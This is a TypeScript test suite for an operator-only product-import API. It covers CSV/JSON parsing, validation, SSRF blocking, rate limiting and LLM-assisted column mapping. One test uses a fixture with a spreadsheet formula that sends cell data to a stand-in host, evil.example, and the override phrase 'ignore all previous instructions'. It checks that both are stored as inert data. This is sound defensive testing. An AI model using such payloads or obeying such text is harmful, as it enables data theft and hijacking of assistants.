import { readFileSync } from 'node:fs';
import request from 'supertest';
import { afterAll, beforeEach, describe, expect, it } from 'vitest';
import { LlmError } from '../../server/src/assistant/llm.js';
import { FetchBlockedError, FetchFailedError } from '../../server/src/importer/safe-fetch.js';
import { toDownloadUrl } from '../../server/src/importer/service.js';
import { ALICE, bearer, createTestContext, OPERATOR_TOKEN, resetDb } from '../helpers/app.js';
import { callTool, FakeLlm, say } from '../helpers/fake-llm.js';

const fixture = (name: string) => readFileSync(`fixtures/import/${name}`, 'utf8');

/** Serves fixtures/import/<name> at https://files.example/<name>; a few URLs simulate failures. */
const files = new Map<string, { contentType: string; body: string }>();
// eslint-disable-next-line @typescript-eslint/require-await -- async so throws become rejections
async function fakeFetch(url: string) {
  if (url.includes('blocked')) throw new FetchBlockedError('internal.example resolves to 10.0.0.7');
  if (url.includes('down')) throw new FetchFailedError('timed out');
  const name = new URL(url).pathname.slice(1);
  const custom = files.get(name);
  if (custom) return { url, ...custom };
  const contentType = name.endsWith('.json') ? 'application/json' : 'text/csv';
  return { url, contentType, body: fixture(name) };
}

const llm = new FakeLlm();
const { app, db } = createTestContext({}, llm, fakeFetch);
const operator = bearer(OPERATOR_TOKEN);

const importFile = (name: string, dryRun = false) =>
  request(app)
    .post('/api/v1/imports')
    .set(operator)
    .send({ url: `https://files.example/${name}`, dryRun });

beforeEach(async () => {
  files.clear();
  llm.script();
  await resetDb(db);
});
afterAll(() => db.$disconnect());

describe('POST /api/v1/imports', () => {
  it('is operator-only', async () => {
    const body = { url: 'https://files.example/products.csv' };
    await request(app).post('/api/v1/imports').send(body).expect(401);
    await request(app).post('/api/v1/imports').set(bearer(ALICE)).send(body).expect(403);
  });

  it('defaults to a dry run that reports changes without writing products', async () => {
    const before = await db.product.count();
    const res = await request(app)
      .post('/api/v1/imports')
      .set(operator)
      .send({ url: 'https://files.example/products.csv' })
      .expect(201);
    expect(res.body.dryRun).toBe(true);
    expect(res.body.counts).toEqual({ created: 6, updated: 0, unchanged: 0, failed: 0 });
    expect(await db.product.count()).toBe(before);
    expect(res.headers['location']).toBe(`/api/v1/imports/${res.body.id}`);
  });

  it('imports a CSV, and re-importing the same file changes nothing', async () => {
    const first = await importFile('products.csv').expect(201);
    expect(first.body.counts).toEqual({ created: 6, updated: 0, unchanged: 0, failed: 0 });
    expect(first.body.mapping).toMatchObject({
      source: 'aliases',
      fields: { sku: 'sku', name: 'name', price: 'price', stock: 'stock', isActive: 'active' },
    });
    const kettle = await db.product.findUniqueOrThrow({ where: { sku: 'HOM-KT-101' } });
    expect(kettle).toMatchObject({ priceCents: 6900, stock: 30, category: 'Home', isActive: true });
    const headlamp = await db.product.findUniqueOrThrow({ where: { sku: 'OUT-HL-106' } });
    expect(headlamp.isActive).toBe(false);

    const again = await importFile('products.csv').expect(201);
    expect(again.body.counts).toEqual({ created: 0, updated: 0, unchanged: 6, failed: 0 });
  });

  it('new products are searchable by the assistant catalog right away', async () => {
    await importFile('products.csv').expect(201);
    const res = await request(app).get('/api/v1/products?q=kettle').expect(200);
    expect(res.body.data.map((p: { sku: string }) => p.sku)).toEqual(['HOM-KT-101']);
  });

  it('updates existing SKUs and leaves columns the file does not have untouched', async () => {
    const seeded = await db.product.findUniqueOrThrow({ where: { sku: 'AUD-HP-001' } });
    files.set('price-update.csv', {
      contentType: 'text/csv',
      body: 'sku,name,price\nAUD-HP-001,Aurora Wireless Headphones,119.00\n',
    });
    const res = await importFile('price-update.csv').expect(201);
    expect(res.body.counts).toMatchObject({ updated: 1 });
    const updated = await db.product.findUniqueOrThrow({ where: { sku: 'AUD-HP-001' } });
    expect(updated).toMatchObject({
      priceCents: 11900,
      stock: seeded.stock,
      description: seeded.description,
      category: seeded.category,
      isActive: seeded.isActive,
    });
  });

  it('understands a Shopify product export (HTML bodies, $ prices, draft status)', async () => {
    const res = await importFile('shopify-export.csv').expect(201);
    expect(res.body.counts).toMatchObject({ created: 3, failed: 0 });
    expect(res.body.mapping.fields).toMatchObject({
      sku: 'Variant SKU',
      name: 'Title',
      description: 'Body (HTML)',
      category: 'Type',
      price: 'Variant Price',
      stock: 'Variant Inventory Qty',
    });
    const lamp = await db.product.findUniqueOrThrow({ where: { sku: 'HOM-DL-201' } });
    expect(lamp.priceCents).toBe(4500);
    expect(lamp.description).toBe(
      'Dimmable LED desk lamp with 5 colour temperatures and a USB-A charging port.',
    );
    const box = await db.product.findUniqueOrThrow({ where: { sku: 'HOM-CB-203' } });
    expect(box.isActive).toBe(false);
  });

  it('imports JSON ({ products: [...] }) with numeric and string prices', async () => {
    const res = await importFile('products.json').expect(201);
    expect(res.body.counts).toMatchObject({ created: 2, failed: 0 });
    const mic = await db.product.findUniqueOrThrow({ where: { sku: 'AUD-MC-302' } });
    expect(mic).toMatchObject({ priceCents: 7999, stock: 22, name: 'USB Podcast Microphone' });
  });

  it('imports valid rows and reports each invalid row with a reason', async () => {
    const res = await importFile('malformed.csv').expect(201);
    expect(res.body.counts).toEqual({ created: 2, updated: 0, unchanged: 0, failed: 7 });
    const byRow = Object.fromEntries(
      res.body.rows.map((r: { row: number; errors?: string[] }) => [r.row, r.errors?.join('; ')]),
    );
    expect(byRow[1]).toMatch(/price: required/);
    expect(byRow[2]).toMatch(/price: "12,99" is not a price/);
    expect(byRow[3]).toMatch(/stock/);
    expect(byRow[4]).toMatch(/isActive: "maybe"/);
    expect(byRow[5]).toMatch(/sku/);
    expect(byRow[6]).toMatch(/name/);
    expect(byRow[8]).toMatch(/duplicate SKU \(first seen in row 7\)/);
    const dup = await db.product.findUniqueOrThrow({ where: { sku: 'DUP-007' } });
    expect(dup.name).toBe('Duplicate First');
    expect(await db.product.findUnique({ where: { sku: 'OK-009' } })).not.toBeNull();
  });

  it('stores formulas, markup and prompt-injection text as inert plain data', async () => {
    const res = await importFile('hostile.csv').expect(201);
    expect(res.body.counts).toMatchObject({ created: 3, failed: 0 });
    const formula = await db.product.findUniqueOrThrow({ where: { sku: 'HOS-001' } });
    expect(formula.name).toBe('=HYPERLINK("http://evil.example/?leak="&A1,"Click me")');
    const injection = await db.product.findUniqueOrThrow({ where: { sku: 'HOS-002' } });
    expect(injection.description).toContain('ignore all previous instructions');
    // The API returns it as JSON data; nothing is executed or interpreted server-side.
    const api = await request(app).get(`/api/v1/products/${injection.id}`).expect(200);
    expect(api.body.description).toBe(injection.description);
  });

  it('asks the model for a column mapping when headers are unknown (headers only)', async () => {
    llm.script(
      callTool('map_columns', {
        sku: 'Artikelnummer',
        name: 'Bezeichnung',
        price: 'Preis',
        stock: 'Lagerbestand',
        description: null,
        category: null,
        priceCents: null,
        currency: null,
        isActive: null,
      }),
    );
    const res = await importFile('odd-headers.csv').expect(201);
    expect(res.body.mapping.source).toBe('model');
    expect(res.body.counts).toMatchObject({ created: 2, failed: 0 });
    const prompt = JSON.stringify(llm.requests[0]?.messages);
    expect(prompt).toContain('Artikelnummer');
    expect(prompt).not.toContain('Thermobecher'); // row values never reach the model
    const mug = await db.product.findUniqueOrThrow({ where: { sku: 'DE-001' } });
    expect(mug).toMatchObject({ priceCents: 1990, stock: 12, category: 'Uncategorized' });
  });

  it('rejects a model mapping that names a column the file does not have', async () => {
    llm.script(callTool('map_columns', { sku: 'id', name: 'Bezeichnung', price: 'Preis' }));
    const res = await importFile('odd-headers.csv').expect(422);
    expect(res.body.type).toBe('/problems/unmappable-columns');
    expect(res.body.missing).toEqual(['sku', 'name', 'price']);
  });

  it('reports unmappable columns when the model is unavailable or answers in text', async () => {
    llm.script(new LlmError('provider returned HTTP 500'));
    await importFile('odd-headers.csv').expect(422);
    llm.script(say('I think Artikelnummer is the SKU.'));
    const res = await importFile('odd-headers.csv').expect(422);
    expect(res.body.headers).toEqual(['Artikelnummer', 'Bezeichnung', 'Preis', 'Lagerbestand']);
  });

  it('a blocked URL gets a generic error that does not reveal why', async () => {
    const res = await importFile('blocked.csv').expect(422);
    expect(res.body.type).toBe('/problems/import-url-rejected');
    expect(JSON.stringify(res.body)).not.toContain('10.0.0.7');
  });

  it('a download failure is a 502', async () => {
    const res = await importFile('down.csv').expect(502);
    expect(res.body).toMatchObject({
      type: '/problems/import-source-unavailable',
      detail: 'timed out',
    });
  });

  it('rejects unreadable, empty and oversized files', async () => {
    files.set('broken.json', { contentType: 'application/json', body: '{"products": [' });
    files.set('empty.csv', { contentType: 'text/csv', body: 'sku,name,price\n' });
    files.set('huge.csv', {
      contentType: 'text/csv',
      body: 'sku,name,price\n' + 'X,Y,1\n'.repeat(5_001),
    });
    for (const name of ['broken.json', 'empty.csv', 'huge.csv']) {
      const res = await importFile(name).expect(422);
      expect(res.body.type).toBe('/problems/unreadable-file');
    }
  });

  it('a header named like an Object.prototype key cannot crash the import', async () => {
    files.set('proto.json', {
      contentType: 'application/json',
      body: JSON.stringify([
        { constructor: 'P-1', name: 'One', price: 1 },
        { name: 'Two', price: 2 },
      ]),
    });
    llm.script(callTool('map_columns', { sku: 'constructor', name: 'name', price: 'price' }));
    const res = await importFile('proto.json').expect(201);
    expect(res.body.counts).toMatchObject({ created: 1, failed: 1 });
    expect(res.body.rows[1].errors.join()).toMatch(/sku/);
  });

  it('rejects absurdly long column headers before they reach the model', async () => {
    files.set('long.csv', { contentType: 'text/csv', body: `${'h'.repeat(201)},name\nx,y\n` });
    const res = await importFile('long.csv').expect(422);
    expect(res.body.type).toBe('/problems/unreadable-file');
    expect(llm.requests).toHaveLength(0);
  });

  it('validates the request body', async () => {
    const post = (body: object) =>
      request(app).post('/api/v1/imports').set(operator).send(body).expect(422);
    await post({});
    await post({ url: 'ftp://files.example/products.csv' });
    await post({ url: 'not a url' });
    await post({ url: 'https://files.example/products.csv', dryRun: 'no' });
    await post({ url: 'https://files.example/products.csv', overwrite: true });
  });

  it('the report can be fetched again by id (operator only)', async () => {
    const created = await importFile('products.csv', true).expect(201);
    const res = await request(app)
      .get(`/api/v1/imports/${created.body.id}`)
      .set(operator)
      .expect(200);
    expect(res.body).toEqual(created.body);
    await request(app).get(`/api/v1/imports/${created.body.id}`).set(bearer(ALICE)).expect(403);
    await request(app).get('/api/v1/imports/not-a-uuid').set(operator).expect(404);
  });
});

describe('import rate limit', () => {
  it('limits imports per operator (OWASP API4)', async () => {
    const limited = createTestContext({ IMPORT_RATE_LIMIT_PER_MINUTE: '2' }, undefined, fakeFetch);
    const post = () =>
      request(limited.app)
        .post('/api/v1/imports')
        .set(operator)
        .send({ url: 'https://files.example/products.csv' });
    await post().expect(201);
    await post().expect(201);
    const res = await post().expect(429);
    expect(res.body.type).toBe('/problems/rate-limited');
    await limited.db.$disconnect();
  });
});

describe('toDownloadUrl', () => {
  it('turns a Google Sheets share link into its CSV export, keeping the tab', () => {
    expect(
      toDownloadUrl('https://docs.google.com/spreadsheets/d/1AbC-xyz_9/edit?usp=sharing#gid=42'),
    ).toBe('https://docs.google.com/spreadsheets/d/1AbC-xyz_9/export?format=csv&gid=42');
    expect(toDownloadUrl('https://docs.google.com/spreadsheets/d/1AbC/edit')).toBe(
      'https://docs.google.com/spreadsheets/d/1AbC/export?format=csv',
    );
    expect(toDownloadUrl('https://example.com/products.csv')).toBe(
      'https://example.com/products.csv',
    );
  });
});
